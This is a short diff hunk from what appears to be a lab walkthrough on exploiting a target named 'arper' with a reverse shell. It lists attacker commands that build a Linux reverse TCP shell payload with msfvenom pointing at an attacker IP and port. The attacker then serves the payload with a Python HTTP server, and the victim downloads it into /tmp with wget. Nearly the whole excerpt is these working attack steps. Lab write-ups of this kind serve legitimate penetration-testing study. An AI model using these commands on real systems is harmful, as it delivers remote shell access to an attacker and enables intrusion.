@@ -99,10 +99,9 @@ Exploiting arper utullizing msfvenom as a reverse shell.
 
 (ATTACKER) msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.122.209 
 LPORT=61775 -f elf -o mal
-(ATTACKER) sudo rm -r__MACosx
-(ATTACKER) sudo rm -r 48*
 (ATTACKER) ls 
 (ATTACKER) file mal
+(ATTACKER) python3 -m http.server 8000
 
 (VICTIM) cd /tmp
 (VICTIM) wget http://192.168.122.209:8000/mal
